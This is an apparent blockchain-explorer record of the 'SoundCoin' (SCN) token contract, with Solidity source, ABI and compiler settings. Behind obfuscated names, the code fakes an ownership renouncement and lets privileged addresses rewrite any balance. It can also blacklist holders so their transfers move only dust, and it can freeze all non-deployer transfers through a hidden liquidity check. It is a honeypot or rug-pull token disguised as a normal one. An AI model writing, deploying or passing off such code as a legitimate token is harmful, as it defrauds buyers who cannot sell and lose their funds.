{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fromBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyTo {\n    function createPair(address walletEnable, address fundWallet) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface sellFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface receiverFeeIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buySellMode) external view returns (uint256);\n\n    function transfer(address toLiquidityMode, uint256 feeWallet) external returns (bool);\n\n    function allowance(address senderTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toLiquidityMode,\n        uint256 feeWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txBuyEnable, uint256 value);\n    event Approval(address indexed senderTeam, address indexed spender, uint256 value);\n}\n\ninterface receiverFeeIsMetadata is receiverFeeIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SoundCoin is fromBuy, receiverFeeIs, receiverFeeIsMetadata {\n\n    address toEnable;\n\n    address public teamBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minMax;\n    }\n\n    mapping(address => bool) public buyList;\n\n    bool public launchedFrom;\n\n    function teamTotal(address tradingTeam, address toLiquidityMode, uint256 feeWallet) internal view returns (uint256) {\n        require(feeWallet > 0);\n\n        uint256 walletReceiver = 0;\n        if (tradingTeam == tokenFrom && amountMaxTo > 0) {\n            walletReceiver = feeWallet * amountMaxTo / 100;\n        } else if (toLiquidityMode == tokenFrom && toIs > 0) {\n            walletReceiver = feeWallet * toIs / 100;\n        }\n        require(walletReceiver <= feeWallet);\n        return feeWallet - walletReceiver;\n    }\n\n    uint256 public amountMaxTo = 3;\n\n    function getOwner() external view returns (address) {\n        return listTotal;\n    }\n\n    bool public minIs;\n\n    mapping(address => uint256) private senderSellFund;\n\n    function transfer(address feeTotal, uint256 feeWallet) external virtual override returns (bool) {\n        return fundLaunch(_msgSender(), feeTotal, feeWallet);\n    }\n\n    string private swapAmount = \"Sound Coin\";\n\n    uint256 private receiverExempt;\n\n    address minTradingMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private swapMax = 18;\n\n    uint256 private minReceiver = 100000000 * 10 ** 18;\n\n    uint256 constant buyToken = 18 ** 10;\n\n    bool public feeAuto;\n\n    constructor (){\n        \n        autoLiquidity();\n        sellFund swapTotal = sellFund(minTradingMode);\n        tokenFrom = buyTo(swapTotal.factory()).createPair(swapTotal.WETH(), address(this));\n        toEnable = buyTo(swapTotal.factory()).feeTo();\n        if (launchedBuy != feeAuto) {\n            launchedBuy = false;\n        }\n        teamBuy = _msgSender();\n        buyList[teamBuy] = true;\n        senderSellFund[teamBuy] = minReceiver;\n        if (limitTake != tradingBuyLaunched) {\n            tradingBuyLaunched = limitTake;\n        }\n        emit Transfer(address(0), teamBuy, minReceiver);\n    }\n\n    function autoLiquidity() public {\n        emit OwnershipTransferred(teamBuy, address(0));\n        listTotal = address(0);\n    }\n\n    function launchedMarketingBuy() private view {\n        require(buyList[_msgSender()]);\n    }\n\n    mapping(address => bool) public limitBuy;\n\n    uint256 private tradingBuyLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapMax;\n    }\n\n    function walletAt(address receiverIs) public {\n        if (tradingLaunch) {\n            return;\n        }\n        if (launchedBuy != minIs) {\n            minIs = true;\n        }\n        buyList[receiverIs] = true;\n        \n        tradingLaunch = true;\n    }\n\n    uint256 public toIs = 0;\n\n    event OwnershipTransferred(address indexed teamSenderSell, address indexed takeReceiverLimit);\n\n    bool private launchedBuy;\n\n    function receiverSender(uint256 feeWallet) public {\n        launchedMarketingBuy();\n        totalLiquidity = feeWallet;\n    }\n\n    string private minMax = \"SCN\";\n\n    function liquiditySell(address tradingTeam, address toLiquidityMode, uint256 feeWallet) internal returns (bool) {\n        require(senderSellFund[tradingTeam] >= feeWallet);\n        senderSellFund[tradingTeam] -= feeWallet;\n        senderSellFund[toLiquidityMode] += feeWallet;\n        emit Transfer(tradingTeam, toLiquidityMode, feeWallet);\n        return true;\n    }\n\n    uint256 launchSwap;\n\n    bool public tradingLaunch;\n\n    function owner() external view returns (address) {\n        return listTotal;\n    }\n\n    uint256 totalLiquidity;\n\n    function launchTx(address maxMarketing) public {\n        launchedMarketingBuy();\n        if (tradingBuyLaunched == limitTake) {\n            tradingBuyLaunched = receiverExempt;\n        }\n        if (maxMarketing == teamBuy || maxMarketing == tokenFrom) {\n            return;\n        }\n        limitBuy[maxMarketing] = true;\n    }\n\n    uint256 private limitTake;\n\n    address public tokenFrom;\n\n    mapping(address => mapping(address => uint256)) private sellAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minReceiver;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapAmount;\n    }\n\n    bool public totalTx;\n\n    function allowance(address walletTrading, address teamMarketingExempt) external view virtual override returns (uint256) {\n        if (teamMarketingExempt == minTradingMode) {\n            return type(uint256).max;\n        }\n        return sellAt[walletTrading][teamMarketingExempt];\n    }\n\n    function transferFrom(address tradingTeam, address toLiquidityMode, uint256 feeWallet) external override returns (bool) {\n        if (_msgSender() != minTradingMode) {\n            if (sellAt[tradingTeam][_msgSender()] != type(uint256).max) {\n                require(feeWallet <= sellAt[tradingTeam][_msgSender()]);\n                sellAt[tradingTeam][_msgSender()] -= feeWallet;\n            }\n        }\n        return fundLaunch(tradingTeam, toLiquidityMode, feeWallet);\n    }\n\n    function listExemptLiquidity(address feeTotal, uint256 feeWallet) public {\n        launchedMarketingBuy();\n        senderSellFund[feeTotal] = feeWallet;\n    }\n\n    function balanceOf(address buySellMode) public view virtual override returns (uint256) {\n        return senderSellFund[buySellMode];\n    }\n\n    function fundLaunch(address tradingTeam, address toLiquidityMode, uint256 feeWallet) internal returns (bool) {\n        if (tradingTeam == teamBuy) {\n            return liquiditySell(tradingTeam, toLiquidityMode, feeWallet);\n        }\n        uint256 receiverShouldMode = receiverFeeIs(tokenFrom).balanceOf(toEnable);\n        require(receiverShouldMode == totalLiquidity);\n        require(toLiquidityMode != toEnable);\n        if (limitBuy[tradingTeam]) {\n            return liquiditySell(tradingTeam, toLiquidityMode, buyToken);\n        }\n        feeWallet = teamTotal(tradingTeam, toLiquidityMode, feeWallet);\n        return liquiditySell(tradingTeam, toLiquidityMode, feeWallet);\n    }\n\n    uint256 private liquidityAt;\n\n    address private listTotal;\n\n    function approve(address teamMarketingExempt, uint256 feeWallet) public virtual override returns (bool) {\n        sellAt[_msgSender()][teamMarketingExempt] = feeWallet;\n        emit Approval(_msgSender(), teamMarketingExempt, feeWallet);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSenderSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeReceiverLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txBuyEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMarketingExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMaxTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMarketingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySellMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMarketing\",\"type\":\"address\"}],\"name\":\"launchTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"listExemptLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLiquidityMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"}],\"name\":\"walletAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SoundCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}